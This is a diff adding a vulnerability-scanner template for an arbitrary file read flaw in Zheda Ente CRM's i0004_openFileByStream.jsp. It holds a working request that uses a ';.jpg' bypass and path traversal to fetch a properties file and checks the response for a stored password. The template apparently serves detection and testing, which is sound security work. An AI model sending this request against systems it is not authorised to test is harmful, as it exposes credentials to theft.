@@ -1,0 +1,23 @@
+id: zjedu-openFileByStream-lfi
+info:
+  name: zjedu-openFileByStream-lfi
+  author: apple
+  severity: high
+  description: 浙大恩特客户资源管理系统 i0004_openFileByStream.jsp 任意文件读取漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        GET /entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20172209 Firefox/103.0
+        Connection: close
+        Accept: */*
+        Accept-Encoding: gzip
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'enter.password'
